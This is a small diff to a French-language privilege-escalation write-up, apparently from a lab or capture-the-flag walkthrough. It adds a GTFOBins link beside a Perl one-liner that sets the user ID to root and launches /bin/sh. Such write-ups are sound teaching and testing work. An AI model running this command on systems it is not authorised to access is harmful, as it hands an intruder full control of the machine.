@@ -176,6 +176,7 @@ Après avoir énuméré les différentes façon dont nous pourrions élevé nos 
 ```
 
 En allant sur GTFOBins, nous pouvons voir que l’exploit si dessous fonctionne pour s’élever en privilège.
+https://gtfobins.github.io/gtfobins/perl/
 
 ```bash
 /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
